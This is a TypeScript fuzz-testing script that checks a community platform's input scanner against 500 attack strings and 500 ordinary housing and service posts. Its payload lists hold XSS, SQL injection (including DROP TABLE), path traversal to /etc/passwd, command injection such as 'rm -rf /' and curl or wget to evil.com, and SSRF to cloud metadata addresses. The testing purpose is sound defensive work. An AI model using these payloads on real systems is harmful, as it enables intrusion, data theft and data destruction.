// Comprehensive Fuzz-Testing Script for Security Validation
// Run using: tsx scripts/fuzz-runner.ts

import { scanInput } from '../src/utils/security'
import assert from 'node:assert'

console.log('========================================================================')
// Use a human-readable model reference instead of system strings
console.log('        THE RESIDENT PLATFORM: ADVANCED SECURITY FUZZING RUNNER')
console.log('========================================================================')

const XSS_MUTATIONS = [
  '<script>alert(1)</script>',
  '<ScRiPt>alert(1)</sCrIpT>',
  '<script/src="http://evil.com/x.js"></script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  'JaVaScRiPt:alert(1)',
  'javascript&colon;alert(1)',
  '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)', // decimal/hex javascript
  '<iframe src="javascript:alert(1)">',
  '<embed src="data:text/html,<script>alert(1)</script>">',
  'onfocus=alert(1)',
  'onmouseover=confirm(1)',
  'onclick=prompt(1)',
  '<body onload=evil()>',
  '<a href="javascript:evil()">link</a>'
]

const SQLI_MUTATIONS = [
  "' UNION SELECT null, null, null --",
  "admin' --",
  "' OR 1=1 --",
  "' OR '1'='1",
  "'; DROP TABLE res_profiles; --",
  "'; DELETE FROM res_listings; --",
  "SELECT * FROM pg_sleep(5);",
  "1; SELECT pg_sleep(5);",
  "admin' AND 1=2 --",
  "admin' AND 'a'='b'",
  "xp_cmdshell('dir')",
  "exec('xp_cmdshell')"
]

const PATH_TRAVERSAL_MUTATIONS = [
  '../../../../etc/passwd',
  '..\\..\\..\\windows\\win.ini',
  '/etc/passwd',
  '/proc/self/environ',
  'file%00.txt',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
]

const COMMAND_INJECTION_MUTATIONS = [
  '; cat /etc/passwd',
  '| id',
  '`whoami`',
  '$(id)',
  '&& rm -rf /',
  '; curl http://evil.com',
  '; wget http://evil.com',
  'system("ls -la")'
]

const SSRF_MUTATIONS = [
  'http://127.0.0.1/admin',
  'http://localhost/admin',
  'http://169.254.169.254/latest/meta-data',
  'http://metadata.google.internal',
  'http://10.0.0.1/internal',
  'http://192.168.1.1/config',
  'file:///etc/passwd',
  'gopher://127.0.0.1:70/'
]

const SAFE_COMMUNITY_INPUTS = [
  'Clean backyard room available for rent in Ivory Park.',
  'Looking for a female roommate to share a 2-bedroom apartment in Midrand.',
  'Sipho Plumbers: Leak repairs and geyser installations. Contact 0821112222.',
  'Bakkie lift club from Tembisa to Sandton. R50 per seat. 4 seats left.',
  'Borrowing a drill from the tool library. Will return it by Friday.',
  'Prepaid sub-meter electricity token code: ZAR 150.',
  'Notice: Community meeting scheduled for Saturday at 2PM in the courtyard.',
  'Dispute: Noise complaint resolved between room 4 and room 5.',
  'We need to fix the water tap in the shared garden next week.',
  'I am looking for a spaza shop that sells fresh milk nearby.'
]

// Generate mutated inputs
const generateFuzzPayloads = () => {
  const payloads: { text: string; type: string }[] = []
  
  // 1. Generate 500 attack vectors (mix and match mutations)
  for (let i = 0; i < 500; i++) {
    const xss = XSS_MUTATIONS[i % XSS_MUTATIONS.length]
    const sqli = SQLI_MUTATIONS[i % SQLI_MUTATIONS.length]
    const trav = PATH_TRAVERSAL_MUTATIONS[i % PATH_TRAVERSAL_MUTATIONS.length]
    const cmd = COMMAND_INJECTION_MUTATIONS[i % COMMAND_INJECTION_MUTATIONS.length]
    const ssrf = SSRF_MUTATIONS[i % SSRF_MUTATIONS.length]

    const choice = i % 5
    if (choice === 0) payloads.push({ text: `Looking for a room ${xss}`, type: 'XSS' })
    else if (choice === 1) payloads.push({ text: `Available ${sqli} in Sandton`, type: 'SQLi' })
    else if (choice === 2) payloads.push({ text: `Proof document: ${trav}`, type: 'Path Traversal' })
    else if (choice === 3) payloads.push({ text: `Service category: plumber ${cmd}`, type: 'Command Injection' })
    else payloads.push({ text: `Profile website: ${ssrf}`, type: 'SSRF' })
  }

  // 2. Generate 500 safe inputs (variations of safe community inputs)
  for (let i = 0; i < 500; i++) {
    const safeText = SAFE_COMMUNITY_INPUTS[i % SAFE_COMMUNITY_INPUTS.length]
    payloads.push({ text: `${safeText} (Reference ID: ${i})`, type: 'SAFE' })
  }

  return payloads
}

const runFuzzTest = () => {
  const payloads = generateFuzzPayloads()
  console.log(`Generated ${payloads.length} fuzz payloads (500 malicious mutations, 500 safe inputs).`)

  let blockedMalicious = 0
  let allowedSafe = 0
  const falsePositives: string[] = []
  const falseNegatives: string[] = []

  const startTime = Date.now()

  payloads.forEach(payload => {
    const result = scanInput(payload.text)
    if (payload.type === 'SAFE') {
      if (result.safe) {
        allowedSafe++
      } else {
        falsePositives.push(`Input: "${payload.text}" | Flagged: ${result.threats.join(', ')}`)
      }
    } else {
      if (!result.safe) {
        blockedMalicious++
      } else {
        falseNegatives.push(`Type: ${payload.type} | Input: "${payload.text}"`)
      }
    }
  })

  const duration = Date.now() - startTime

  console.log('------------------------------------------------------------------------')
  console.log(`Fuzzing completed in ${duration}ms`)
  console.log(`Malicious payloads blocked: ${blockedMalicious}/500 (${(blockedMalicious/5).toFixed(1)}%)`)
  console.log(`Safe payloads allowed: ${allowedSafe}/500 (${(allowedSafe/5).toFixed(1)}%)`)
  console.log('------------------------------------------------------------------------')

  if (falseNegatives.length > 0) {
    console.error('❌ FAIL: False Negatives found! Malicious payloads bypass security filters:')
    falseNegatives.forEach(fn => console.error(`  - ${fn}`))
  }
  
  if (falsePositives.length > 0) {
    console.error('❌ FAIL: False Positives found! Safe inputs blocked erroneously:')
    falsePositives.forEach(fp => console.error(`  - ${fp}`))
  }

  assert.strictEqual(blockedMalicious, 500, 'All malicious payloads must be blocked')
  assert.strictEqual(allowedSafe, 500, 'All safe payloads must be allowed')

  console.log('🎉 SUCCESS: Fuzzer run completed with 100% detection rate and 0% false positives!')
}

runFuzzTest()
